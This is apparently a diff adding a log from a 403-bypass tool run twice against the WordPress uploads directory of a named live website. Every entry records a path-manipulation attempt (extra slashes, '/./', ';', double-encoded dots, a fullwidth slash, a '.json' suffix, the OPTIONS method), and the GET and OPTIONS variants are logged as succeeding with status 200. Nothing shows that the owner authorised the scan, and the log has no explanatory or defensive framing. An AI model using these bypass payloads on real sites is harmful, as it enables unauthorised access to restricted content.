@@ -1,0 +1,80 @@
+2024-09-24 20:57:48,934 - INFO - [36mAttempting 403 bypass for https://appmiral.com/wp-content//uploads/...[0m
+2024-09-24 20:57:48,934 - INFO - [36m[36mAttempting 403 bypass for https://appmiral.com/wp-content//uploads/...[0m[0m
+2024-09-24 20:57:49,185 - INFO - [36mBypass succeeded with GET: https://appmiral.com/wp-content///./uploads/.. (Status: 200)[0m
+2024-09-24 20:57:49,185 - INFO - [36m[36mBypass succeeded with GET: https://appmiral.com/wp-content///./uploads/.. (Status: 200)[0m[0m
+2024-09-24 20:57:50,996 - ERROR - [31mError with GET https://appmiral.com/wp-content///;/uploads: Exceeded 30 redirects.[0m
+2024-09-24 20:57:50,996 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///;/uploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 20:57:51,028 - ERROR - [31mError with GET https://appmiral.com/wp-content///.;/uploads: Exceeded 30 redirects.[0m
+2024-09-24 20:57:51,028 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///.;/uploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 20:57:51,225 - ERROR - [31mError with GET https://appmiral.com/wp-content///%252e/uploads: Exceeded 30 redirects.[0m
+2024-09-24 20:57:51,225 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///%252e/uploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 20:57:51,233 - ERROR - [31mError with GET https://appmiral.com/wp-content///uploads.json: Exceeded 30 redirects.[0m
+2024-09-24 20:57:51,233 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///uploads.json: Exceeded 30 redirects.[0m[0m
+2024-09-24 20:57:51,441 - ERROR - [31mError with GET https://appmiral.com/wp-content///%ef%bc%8fuploads: Exceeded 30 redirects.[0m
+2024-09-24 20:57:51,441 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///%ef%bc%8fuploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 20:57:53,361 - ERROR - [31mError with GET https://appmiral.com/wp-content///.;/uploads: Exceeded 30 redirects.[0m
+2024-09-24 20:57:53,361 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///.;/uploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 20:57:53,507 - ERROR - [31mError with GET https://appmiral.com/wp-content///;/uploads: Exceeded 30 redirects.[0m
+2024-09-24 20:57:53,507 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///;/uploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 20:57:53,629 - ERROR - [31mError with GET https://appmiral.com/wp-content///%252e/uploads: Exceeded 30 redirects.[0m
+2024-09-24 20:57:53,629 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///%252e/uploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 20:57:53,651 - ERROR - [31mError with GET https://appmiral.com/wp-content///uploads.json: Exceeded 30 redirects.[0m
+2024-09-24 20:57:53,651 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///uploads.json: Exceeded 30 redirects.[0m[0m
+2024-09-24 20:57:53,898 - ERROR - [31mError with GET https://appmiral.com/wp-content///%ef%bc%8fuploads: Exceeded 30 redirects.[0m
+2024-09-24 20:57:53,898 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///%ef%bc%8fuploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 20:57:56,480 - ERROR - [31mError with GET https://appmiral.com/wp-content///;/uploads: Exceeded 30 redirects.[0m
+2024-09-24 20:57:56,480 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///;/uploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 20:57:56,645 - ERROR - [31mError with GET https://appmiral.com/wp-content///.;/uploads: Exceeded 30 redirects.[0m
+2024-09-24 20:57:56,645 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///.;/uploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 20:57:56,653 - ERROR - [31mError with GET https://appmiral.com/wp-content///uploads.json: Exceeded 30 redirects.[0m
+2024-09-24 20:57:56,653 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///uploads.json: Exceeded 30 redirects.[0m[0m
+2024-09-24 20:57:56,677 - ERROR - [31mError with GET https://appmiral.com/wp-content///%252e/uploads: Exceeded 30 redirects.[0m
+2024-09-24 20:57:56,677 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///%252e/uploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 20:57:56,921 - ERROR - [31mError with GET https://appmiral.com/wp-content///%ef%bc%8fuploads: Exceeded 30 redirects.[0m
+2024-09-24 20:57:56,921 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///%ef%bc%8fuploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 20:58:03,560 - INFO - [36mBypass succeeded with OPTIONS: https://appmiral.com/wp-content//uploads/ (Status: 200)[0m
+2024-09-24 20:58:03,560 - INFO - [36m[36mBypass succeeded with OPTIONS: https://appmiral.com/wp-content//uploads/ (Status: 200)[0m[0m
+Bypass succeeded with GET: https://appmiral.com/wp-content///./uploads/.. (Status: 200)
+Bypass succeeded with OPTIONS: https://appmiral.com/wp-content//uploads/ (Status: 200)
+2024-09-24 20:58:04,648 - INFO - [36mResults logged to bypass_log.txt[0m
+2024-09-24 20:58:04,648 - INFO - [36m[36mResults logged to bypass_log.txt[0m[0m
+2024-09-24 21:04:29,591 - INFO - [36mAttempting 403 bypass for https://appmiral.com/wp-content//uploads/...[0m
+2024-09-24 21:04:29,591 - INFO - [36m[36mAttempting 403 bypass for https://appmiral.com/wp-content//uploads/...[0m[0m
+2024-09-24 21:04:29,793 - INFO - [36mBypass succeeded with GET: https://appmiral.com/wp-content///./uploads/.. (Status: 200)[0m
+2024-09-24 21:04:29,793 - INFO - [36m[36mBypass succeeded with GET: https://appmiral.com/wp-content///./uploads/.. (Status: 200)[0m[0m
+2024-09-24 21:04:31,391 - ERROR - [31mError with GET https://appmiral.com/wp-content///.;/uploads: Exceeded 30 redirects.[0m
+2024-09-24 21:04:31,391 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///.;/uploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 21:04:31,508 - ERROR - [31mError with GET https://appmiral.com/wp-content///;/uploads: Exceeded 30 redirects.[0m
+2024-09-24 21:04:31,508 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///;/uploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 21:04:31,676 - ERROR - [31mError with GET https://appmiral.com/wp-content///%252e/uploads: Exceeded 30 redirects.[0m
+2024-09-24 21:04:31,676 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///%252e/uploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 21:04:31,766 - ERROR - [31mError with GET https://appmiral.com/wp-content///uploads.json: Exceeded 30 redirects.[0m
+2024-09-24 21:04:31,766 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///uploads.json: Exceeded 30 redirects.[0m[0m
+2024-09-24 21:04:31,849 - ERROR - [31mError with GET https://appmiral.com/wp-content///%ef%bc%8fuploads: Exceeded 30 redirects.[0m
+2024-09-24 21:04:31,849 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///%ef%bc%8fuploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 21:04:33,357 - ERROR - [31mError with GET https://appmiral.com/wp-content///.;/uploads: Exceeded 30 redirects.[0m
+2024-09-24 21:04:33,357 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///.;/uploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 21:04:33,508 - ERROR - [31mError with GET https://appmiral.com/wp-content///;/uploads: Exceeded 30 redirects.[0m
+2024-09-24 21:04:33,508 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///;/uploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 21:04:33,638 - ERROR - [31mError with GET https://appmiral.com/wp-content///uploads.json: Exceeded 30 redirects.[0m
+2024-09-24 21:04:33,638 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///uploads.json: Exceeded 30 redirects.[0m[0m
+2024-09-24 21:04:33,674 - ERROR - [31mError with GET https://appmiral.com/wp-content///%252e/uploads: Exceeded 30 redirects.[0m
+2024-09-24 21:04:33,674 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///%252e/uploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 21:04:33,875 - ERROR - [31mError with GET https://appmiral.com/wp-content///%ef%bc%8fuploads: Exceeded 30 redirects.[0m
+2024-09-24 21:04:33,875 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///%ef%bc%8fuploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 21:04:36,248 - ERROR - [31mError with GET https://appmiral.com/wp-content///.;/uploads: Exceeded 30 redirects.[0m
+2024-09-24 21:04:36,248 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///.;/uploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 21:04:36,585 - ERROR - [31mError with GET https://appmiral.com/wp-content///uploads.json: Exceeded 30 redirects.[0m
+2024-09-24 21:04:36,585 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///uploads.json: Exceeded 30 redirects.[0m[0m
+2024-09-24 21:04:36,729 - ERROR - [31mError with GET https://appmiral.com/wp-content///%252e/uploads: Exceeded 30 redirects.[0m
+2024-09-24 21:04:36,729 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///%252e/uploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 21:04:37,109 - ERROR - [31mError with GET https://appmiral.com/wp-content///%ef%bc%8fuploads: Exceeded 30 redirects.[0m
+2024-09-24 21:04:37,109 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///%ef%bc%8fuploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 21:04:37,262 - ERROR - [31mError with GET https://appmiral.com/wp-content///;/uploads: Exceeded 30 redirects.[0m
+2024-09-24 21:04:37,262 - ERROR - [31m[31mError with GET https://appmiral.com/wp-content///;/uploads: Exceeded 30 redirects.[0m[0m
+2024-09-24 21:04:43,881 - INFO - [36mBypass succeeded with OPTIONS: https://appmiral.com/wp-content//uploads/ (Status: 200)[0m
+2024-09-24 21:04:43,881 - INFO - [36m[36mBypass succeeded with OPTIONS: https://appmiral.com/wp-content//uploads/ (Status: 200)[0m[0m
+Bypass succeeded with GET: https://appmiral.com/wp-content///./uploads/.. (Status: 200)
+Bypass succeeded with OPTIONS: https://appmiral.com/wp-content//uploads/ (Status: 200)
+2024-09-24 21:04:44,863 - INFO - [36mResults logged to bypass_log.txt[0m
+2024-09-24 21:04:44,863 - INFO - [36m[36mResults logged to bypass_log.txt[0m[0m
